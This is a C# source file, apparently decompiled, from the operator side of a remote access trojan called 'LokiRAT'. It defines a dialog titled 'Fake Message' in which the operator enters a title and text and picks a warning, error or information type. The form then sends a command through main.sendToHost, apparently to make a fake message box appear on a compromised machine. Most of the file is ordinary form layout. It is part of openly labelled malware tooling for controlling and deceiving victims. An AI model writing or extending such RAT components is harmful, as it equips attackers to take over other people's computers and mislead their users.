namespace LokiRAT_Server
{
    using System;
    using System.ComponentModel;
    using System.Drawing;
    using System.Windows.Forms;

    public class message : Form
    {
        private Button button1;
        private IContainer components = null;
        private GroupBox groupBox1;
        private Label label1;
        private Label label2;
        private RadioButton radioButton1;
        private RadioButton radioButton2;
        private RadioButton radioButton3;
        private RichTextBox richTextBox1;
        private TextBox textBox1;

        public message()
        {
            this.InitializeComponent();
        }

        private void button1_Click(object sender, EventArgs e)
        {
            string str = null;
            if (this.radioButton1.Checked)
            {
                str = "warning";
            }
            else if (this.radioButton3.Checked)
            {
                str = "error";
            }
            else if (this.radioButton2.Checked)
            {
                str = "information";
            }
            main.sendToHost("type=command&command=message|" + this.richTextBox1.Text + "|" + this.textBox1.Text + "|" + str);
            base.Close();
        }

        protected override void Dispose(bool disposing)
        {
            if (disposing && (this.components != null))
            {
                this.components.Dispose();
            }
            base.Dispose(disposing);
        }

        private void InitializeComponent()
        {
            this.radioButton1 = new RadioButton();
            this.radioButton2 = new RadioButton();
            this.radioButton3 = new RadioButton();
            this.groupBox1 = new GroupBox();
            this.richTextBox1 = new RichTextBox();
            this.label1 = new Label();
            this.label2 = new Label();
            this.textBox1 = new TextBox();
            this.button1 = new Button();
            this.groupBox1.SuspendLayout();
            base.SuspendLayout();
            this.radioButton1.AutoSize = true;
            this.radioButton1.Location = new Point(12, 0x1a);
            this.radioButton1.Name = "radioButton1";
            this.radioButton1.Size = new Size(0x41, 0x11);
            this.radioButton1.TabIndex = 0;
            this.radioButton1.Text = "Warning";
            this.radioButton1.UseVisualStyleBackColor = true;
            this.radioButton2.AutoSize = true;
            this.radioButton2.Checked = true;
            this.radioButton2.Location = new Point(0x102, 0x1a);
            this.radioButton2.Name = "radioButton2";
            this.radioButton2.Size = new Size(0x4d, 0x11);
            this.radioButton2.TabIndex = 1;
            this.radioButton2.TabStop = true;
            this.radioButton2.Text = "Information";
            this.radioButton2.UseVisualStyleBackColor = true;
            this.radioButton3.AutoSize = true;
            this.radioButton3.Location = new Point(0x95, 0x1a);
            this.radioButton3.Name = "radioButton3";
            this.radioButton3.Size = new Size(0x2f, 0x11);
            this.radioButton3.TabIndex = 2;
            this.radioButton3.Text = "Error";
            this.radioButton3.UseVisualStyleBackColor = true;
            this.groupBox1.Controls.Add(this.radioButton1);
            this.groupBox1.Controls.Add(this.radioButton2);
            this.groupBox1.Controls.Add(this.radioButton3);
            this.groupBox1.Location = new Point(12, 0x12d);
            this.groupBox1.Name = "groupBox1";
            this.groupBox1.Size = new Size(0x15b, 0x39);
            this.groupBox1.TabIndex = 3;
            this.groupBox1.TabStop = false;
            this.groupBox1.Text = "Message Type";
            this.richTextBox1.Location = new Point(12, 0x4f);
            this.richTextBox1.Name = "richTextBox1";
            this.richTextBox1.Size = new Size(0x15b, 0xd8);
            this.richTextBox1.TabIndex = 4;
            this.richTextBox1.Text = "";
            this.label1.AutoSize = true;
            this.label1.Location = new Point(12, 0x3f);
            this.label1.Name = "label1";
            this.label1.Size = new Size(0x4d, 13);
            this.label1.TabIndex = 5;
            this.label1.Text = "Message Text:";
            this.label2.AutoSize = true;
            this.label2.Location = new Point(13, 9);
            this.label2.Name = "label2";
            this.label2.Size = new Size(0x4c, 13);
            this.label2.TabIndex = 6;
            this.label2.Text = "Message Title:";
            this.textBox1.Location = new Point(12, 0x19);
            this.textBox1.Name = "textBox1";
            this.textBox1.Size = new Size(0x15b, 20);
            this.textBox1.TabIndex = 7;
            this.button1.Location = new Point(0xd4, 0x179);
            this.button1.Name = "button1";
            this.button1.Size = new Size(0x93, 0x1d);
            this.button1.TabIndex = 8;
            this.button1.Text = "Send Message";
            this.button1.UseVisualStyleBackColor = true;
            this.button1.Click += new EventHandler(this.button1_Click);
            base.AutoScaleDimensions = new SizeF(6f, 13f);
            base.AutoScaleMode = AutoScaleMode.Font;
            base.ClientSize = new Size(0x16f, 0x19c);
            base.Controls.Add(this.button1);
            base.Controls.Add(this.textBox1);
            base.Controls.Add(this.label2);
            base.Controls.Add(this.label1);
            base.Controls.Add(this.richTextBox1);
            base.Controls.Add(this.groupBox1);
            base.FormBorderStyle = FormBorderStyle.FixedDialog;
            base.Name = "message";
            this.Text = "Fake Message | LokiRAT";
            this.groupBox1.ResumeLayout(false);
            this.groupBox1.PerformLayout();
            base.ResumeLayout(false);
            base.PerformLayout();
        }
    }
}

